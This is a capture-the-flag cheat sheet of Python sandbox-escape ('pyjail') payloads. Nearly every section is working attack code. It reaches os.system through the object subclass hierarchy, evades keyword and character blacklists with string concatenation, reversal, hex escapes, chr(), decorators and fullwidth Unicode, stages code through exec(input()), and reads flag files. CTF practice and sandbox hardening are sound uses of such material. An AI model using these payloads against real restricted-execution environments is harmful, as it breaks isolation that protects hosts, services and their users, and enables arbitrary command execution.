# Pyjail Bypass Techniques

## No Builtins Access

```python
# Access builtins via class hierarchy
().__class__.__base__.__subclasses__()

# Find useful classes
[x for x in ().__class__.__base__.__subclasses__() if 'wrap' in str(x)]
# Look for: os._wrap_close, subprocess.Popen, etc.

# Get os module from os._wrap_close (usually around index 132)
().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('cat flag')

# Alternative: Use warnings.catch_warnings
[x for x in ().__class__.__base__.__subclasses__() if 'warning' in str(x).lower()]
```

## Finding Class Index

```python
# Enumerate to find useful classes
for i, cls in enumerate(().__class__.__base__.__subclasses__()):
    if 'wrap' in str(cls) or 'Popen' in str(cls) or 'warning' in str(cls):
        print(i, cls)

# Common useful indices (varies by Python version):
# os._wrap_close: ~132-140
# subprocess.Popen: ~250-280
# warnings.catch_warnings: ~140-160
```

## Keyword Blocked Bypass

```python
# String concatenation
__import__('o'+'s').system('cat flag')
getattr(__import__('o'+'s'), 'sys'+'tem')('cat flag')

# Reverse strings
__import__('so'[::-1]).system('cat flag')

# Hex encoding
__import__('\x6f\x73').system('cat flag')

# chr() bypass
__import__(chr(111)+chr(115)).system('cat flag')

# Using globals/locals
globals()['__builtins__']['__import__']('os').system('cat flag')
```

## Character Blacklist Bypass

```python
# No quotes - use chr()
exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115))

# No parentheses - use decorators
@exec
@input
class X:
    pass
# Then type: __import__('os').system('cat flag')

# No underscores - use getattr
getattr(getattr((), dir(())[0])(), dir(getattr((), dir(())[0])())[1])

# Using format strings
f"{__import__('os').system('cat flag')}"
```

## Unicode Bypass

```python
# Unicode normalization bypass
eval("__import__('os').system('id')")  # Normal
ｅｖａｌ("__import__('os').system('id')")  # Fullwidth
# Math symbols: 𝘦𝘷𝘢𝘭 -> eval
```

## Length-Restricted Payloads

```python
# Short payloads
exec(input())  # 12 chars, then paste full payload
help()  # Opens interactive help, type !cat flag

# Staged execution
a=input();exec(a)
```

## No Import Bypass

```python
# Using __builtins__ dict
__builtins__.__dict__['__import__']('os').system('cat flag')

# Via open()
open('flag.txt').read()
print(open('flag.txt').read())

# Via subclasses - find FileLoader
[x for x in ().__class__.__base__.__subclasses__() if 'Loader' in str(x)]
```
